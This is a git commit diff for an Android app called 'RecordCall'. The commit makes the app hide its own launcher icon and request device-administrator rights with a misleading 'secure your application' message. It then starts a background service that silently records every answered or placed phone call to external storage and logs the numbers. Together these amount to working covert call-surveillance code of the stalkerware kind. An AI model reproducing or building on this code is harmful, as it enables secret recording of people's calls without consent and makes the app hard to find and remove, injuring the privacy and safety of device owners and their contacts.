6989e44ff6bbe35bc42ca3da4ef42d0eff3374b0
zicyApp <polovitzer.robert@gmail.com>
2017-08-16 10:27:09 -0400

    Update

--- RecordCall/app/src/main/java/app/test/com/recordcall/MainActivity.java
+++ RecordCall/app/src/main/java/app/test/com/recordcall/MainActivity.java
@@ -1,9 +1,11 @@
 package app.test.com.recordcall;
 
+import android.app.Activity;
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.support.design.widget.FloatingActionButton;
 import android.support.design.widget.Snackbar;
@@ -15,66 +17,42 @@ import android.view.MenuItem;
 
 public class MainActivity extends AppCompatActivity {
 
-    private static final int REQUEST_CODE = 0;
-    private DevicePolicyManager mDPM;
-    private ComponentName mAdminName;
+        public static final int REQUEST_CODE = 5912;
 
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
-        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
-        setSupportActionBar(toolbar);
+        @Override
+        protected void onCreate(Bundle savedInstanceState) {
+            super.onCreate(savedInstanceState);
+            PackageManager p = getPackageManager();
+            ComponentName componentName = new ComponentName(this, MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
+            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+            try {
+                // Initiate DevicePolicyManager.
+                DevicePolicyManager mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+                ComponentName mAdminName = new ComponentName(this, DeviceAdminDemo.class);
 
-        try {
-            // Initiate DevicePolicyManager.
-            mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
-            mAdminName = new ComponentName(this, DeviceAdminDemo.class);
-
-            if (!mDPM.isAdminActive(mAdminName)) {
-                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
-                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mAdminName);
-                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Click on Activate button to secure your application.");
-                startActivityForResult(intent, REQUEST_CODE);
-            } else {
-                // mDPM.lockNow();
-                // Intent intent = new Intent(MainActivity.this,
-                // TrackDeviceService.class);
-                // startService(intent);
+                if (!mDPM.isAdminActive(mAdminName)) {
+                    Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+                    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mAdminName);
+                    intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Click on Activate button to secure your application.");
+                    startActivityForResult(intent, REQUEST_CODE);
+                } else {
+                    mDPM.lockNow();
+                    finish();
+//                 Intent intent = new Intent(MainActivity.this,
+//                 TrackDeviceService.class);
+//                 startService(intent);
+                }
+            } catch (Exception e) {
+                e.printStackTrace();
             }
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
-    @Override
-    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
-        super.onActivityResult(requestCode, resultCode, data);
-        if (REQUEST_CODE == requestCode) {
-            Intent intent = new Intent(MainActivity.this, TService.class);
-            startService(intent);
-        }
-    }
-
-    @Override
-    public boolean onCreateOptionsMenu(Menu menu) {
-        // Inflate the menu; this adds items to the action bar if it is present.
-        getMenuInflater().inflate(R.menu.menu_main, menu);
-        return true;
-    }
-
-    @Override
-    public boolean onOptionsItemSelected(MenuItem item) {
-        // Handle action bar item clicks here. The action bar will
-        // automatically handle clicks on the Home/Up button, so long
-        // as you specify a parent activity in AndroidManifest.xml.
-        int id = item.getItemId();
-
-        //noinspection SimplifiableIfStatement
-        if (id == R.id.action_settings) {
-            return true;
         }
 
-        return super.onOptionsItemSelected(item);
-    }
+        @Override
+        protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+            if (REQUEST_CODE == requestCode) {
+                startService(new Intent(MainActivity.this, TService.class));
+                finish();
+            }
+            super.onActivityResult(requestCode, resultCode, data);
+        }
 }
--- RecordCall/app/src/main/java/app/test/com/recordcall/TService.java
+++ RecordCall/app/src/main/java/app/test/com/recordcall/TService.java
@@ -25,25 +25,13 @@ import java.util.Timer;
 import java.util.logging.Handler;
 
 public class TService extends Service {
-    MediaRecorder recorder;
-    File audiofile;
-    String name, phonenumber;
-    String audio_format;
-    public String Audio_Type;
-    int audioSource;
-    Context context;
-    private Handler handler;
-    Timer timer;
-    Boolean offHook = false, ringing = false;
-    Toast toast;
-    Boolean isOffHook = false;
+
+    private MediaRecorder recorder;
+    private File audiofile;
     private boolean recordstarted = false;
 
     private static final String ACTION_IN = "android.intent.action.PHONE_STATE";
     private static final String ACTION_OUT = "android.intent.action.NEW_OUTGOING_CALL";
-    private CallBr br_call;
-
-
 
 
     @Override
@@ -61,98 +49,182 @@ public class TService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        // final String terminate =(String)
-        // intent.getExtras().get("terminate");//
-        // intent.getStringExtra("terminate");
-        // Log.d("TAG", "service started");
-        //
-        // TelephonyManager telephony = (TelephonyManager)
-        // getSystemService(Context.TELEPHONY_SERVICE); // TelephonyManager
-        // // object
-        // CustomPhoneStateListener customPhoneListener = new
-        // CustomPhoneStateListener();
-        // telephony.listen(customPhoneListener,
-        // PhoneStateListener.LISTEN_CALL_STATE);
-        // context = getApplicationContext();
-
+        Log.d("StartService", "TService");
         final IntentFilter filter = new IntentFilter();
         filter.addAction(ACTION_OUT);
         filter.addAction(ACTION_IN);
-        this.br_call = new CallBr();
-        this.registerReceiver(this.br_call, filter);
-
-        // if(terminate != null) {
-        // stopSelf();
-        // }
-        return START_NOT_STICKY;
+        this.registerReceiver(new CallReceiver(), filter);
+        return super.onStartCommand(intent, flags, startId);
     }
 
-    public class CallBr extends BroadcastReceiver {
-        Bundle bundle;
-        String state;
-        String inCall, outCall;
-        public boolean wasRinging = false;
+    private void startRecording() {
+        File sampleDir = new File(Environment.getExternalStorageDirectory(), "/TestRecordingDasa1");
+        if (!sampleDir.exists()) {
+            sampleDir.mkdirs();
+        }
+        String file_name = "Record";
+        try {
+            audiofile = File.createTempFile(file_name, ".amr", sampleDir);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        String path = Environment.getExternalStorageDirectory().getAbsolutePath();
+
+        recorder = new MediaRecorder();
+//                          recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
+
+        recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
+        recorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
+        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+        recorder.setOutputFile(audiofile.getAbsolutePath());
+        try {
+            recorder.prepare();
+        } catch (IllegalStateException e) {
+            e.printStackTrace();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        recorder.start();
+        recordstarted = true;
+    }
+
+    private void stopRecording() {
+        if (recordstarted) {
+            recorder.stop();
+            recordstarted = false;
+        }
+    }
+
+
+    public abstract class PhonecallReceiver extends BroadcastReceiver {
+
+        //The receiver will be recreated whenever android feels like it.  We need a static variable to remember data between instantiations
+
+        private int lastState = TelephonyManager.CALL_STATE_IDLE;
+        private Date callStartTime;
+        private boolean isIncoming;
+        private String savedNumber;  //because the passed incoming is only valid in ringing
+
 
         @Override
         public void onReceive(Context context, Intent intent) {
-            if (intent.getAction().equals(ACTION_IN)) {
-                if ((bundle = intent.getExtras()) != null) {
-                    state = bundle.getString(TelephonyManager.EXTRA_STATE);
-                    if (state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
-                        inCall = bundle.getString(TelephonyManager.EXTRA_INCOMING_NUMBER);
-                        wasRinging = true;
-                        Toast.makeText(context, "IN : " + inCall, Toast.LENGTH_LONG).show();
-                    } else if (state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
-                        if (wasRinging == true) {
-
-                            Toast.makeText(context, "ANSWERED", Toast.LENGTH_LONG).show();
-
-                            String out = new SimpleDateFormat("dd-MM-yyyy hh-mm-ss").format(new Date());
-                            File sampleDir = new File(Environment.getExternalStorageDirectory(), "/TestRecordingDasa1");
-                            if (!sampleDir.exists()) {
-                                sampleDir.mkdirs();
-                            }
-                            String file_name = "Record";
-                            try {
-                                audiofile = File.createTempFile(file_name, ".amr", sampleDir);
-                            } catch (IOException e) {
-                                e.printStackTrace();
-                            }
-                            String path = Environment.getExternalStorageDirectory().getAbsolutePath();
-
-                            recorder = new MediaRecorder();
-//                          recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
-
-                            recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
-                            recorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
-                            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
-                            recorder.setOutputFile(audiofile.getAbsolutePath());
-                            try {
-                                recorder.prepare();
-                            } catch (IllegalStateException e) {
-                                e.printStackTrace();
-                            } catch (IOException e) {
-                                e.printStackTrace();
-                            }
-                            recorder.start();
-                            recordstarted = true;
-                        }
-                    } else if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
-                        wasRinging = false;
-                        Toast.makeText(context, "REJECT || DISCO", Toast.LENGTH_LONG).show();
-                        if (recordstarted) {
-                            recorder.stop();
-                            recordstarted = false;
-                        }
-                    }
+//        startRecording();
+            //We listen to two intents.  The new outgoing call only tells us of an outgoing call.  We use it to get the number.
+            if (intent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")) {
+                savedNumber = intent.getExtras().getString("android.intent.extra.PHONE_NUMBER");
+            } else {
+                String stateStr = intent.getExtras().getString(TelephonyManager.EXTRA_STATE);
+                String number = intent.getExtras().getString(TelephonyManager.EXTRA_INCOMING_NUMBER);
+                int state = 0;
+                if (stateStr.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
+                    state = TelephonyManager.CALL_STATE_IDLE;
+                } else if (stateStr.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
+                    state = TelephonyManager.CALL_STATE_OFFHOOK;
+                } else if (stateStr.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
+                    state = TelephonyManager.CALL_STATE_RINGING;
                 }
-            } else if (intent.getAction().equals(ACTION_OUT)) {
-                if ((bundle = intent.getExtras()) != null) {
-                    outCall = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
-                    Toast.makeText(context, "OUT : " + outCall, Toast.LENGTH_LONG).show();
-                }
+
+
+                onCallStateChanged(context, state, number);
             }
         }
+
+        //Derived classes should override these to respond to specific events of interest
+        protected abstract void onIncomingCallReceived(Context ctx, String number, Date start);
+
+        protected abstract void onIncomingCallAnswered(Context ctx, String number, Date start);
+
+        protected abstract void onIncomingCallEnded(Context ctx, String number, Date start, Date end);
+
+        protected abstract void onOutgoingCallStarted(Context ctx, String number, Date start);
+
+        protected abstract void onOutgoingCallEnded(Context ctx, String number, Date start, Date end);
+
+        protected abstract void onMissedCall(Context ctx, String number, Date start);
+
+        //Deals with actual events
+
+        //Incoming call-  goes from IDLE to RINGING when it rings, to OFFHOOK when it's answered, to IDLE when its hung up
+        //Outgoing call-  goes from IDLE to OFFHOOK when it dials out, to IDLE when hung up
+        public void onCallStateChanged(Context context, int state, String number) {
+            if (lastState == state) {
+                //No change, debounce extras
+                return;
+            }
+            switch (state) {
+                case TelephonyManager.CALL_STATE_RINGING:
+                    isIncoming = true;
+                    callStartTime = new Date();
+                    savedNumber = number;
+                    onIncomingCallReceived(context, number, callStartTime);
+                    break;
+                case TelephonyManager.CALL_STATE_OFFHOOK:
+                    //Transition of ringing->offhook are pickups of incoming calls.  Nothing done on them
+                    if (lastState != TelephonyManager.CALL_STATE_RINGING) {
+                        isIncoming = false;
+                        callStartTime = new Date();
+                        startRecording();
+                        onOutgoingCallStarted(context, savedNumber, callStartTime);
+                    } else {
+                        isIncoming = true;
+                        callStartTime = new Date();
+                        startRecording();
+                        onIncomingCallAnswered(context, savedNumber, callStartTime);
+                    }
+
+                    break;
+                case TelephonyManager.CALL_STATE_IDLE:
+                    //Went to idle-  this is the end of a call.  What type depends on previous state(s)
+                    if (lastState == TelephonyManager.CALL_STATE_RINGING) {
+                        //Ring but no pickup-  a miss
+                        onMissedCall(context, savedNumber, callStartTime);
+                    } else if (isIncoming) {
+                        stopRecording();
+                        onIncomingCallEnded(context, savedNumber, callStartTime, new Date());
+                    } else {
+                        stopRecording();
+                        onOutgoingCallEnded(context, savedNumber, callStartTime, new Date());
+                    }
+                    break;
+            }
+            lastState = state;
+        }
+
+    }
+
+    public class CallReceiver extends PhonecallReceiver {
+
+        @Override
+        protected void onIncomingCallReceived(Context ctx, String number, Date start) {
+            Log.d("onIncomingCallReceived", number + " " + start.toString());
+        }
+
+        @Override
+        protected void onIncomingCallAnswered(Context ctx, String number, Date start) {
+            Log.d("onIncomingCallAnswered", number + " " + start.toString());
+        }
+
+        @Override
+        protected void onIncomingCallEnded(Context ctx, String number, Date start, Date end) {
+            Log.d("onIncomingCallEnded", number + " " + start.toString() + "\t" + end.toString());
+        }
+
+        @Override
+        protected void onOutgoingCallStarted(Context ctx, String number, Date start) {
+            Log.d("onOutgoingCallStarted", number + " " + start.toString());
+        }
+
+        @Override
+        protected void onOutgoingCallEnded(Context ctx, String number, Date start, Date end) {
+            Log.d("onOutgoingCallEnded", number + " " + start.toString() + "\t" + end.toString());
+        }
+
+        @Override
+        protected void onMissedCall(Context ctx, String number, Date start) {
+            Log.d("onMissedCall", number + " " + start.toString());
+//        PostCallHandler postCallHandler = new PostCallHandler(number, "janskd" , "")
+        }
+
     }
 
 }
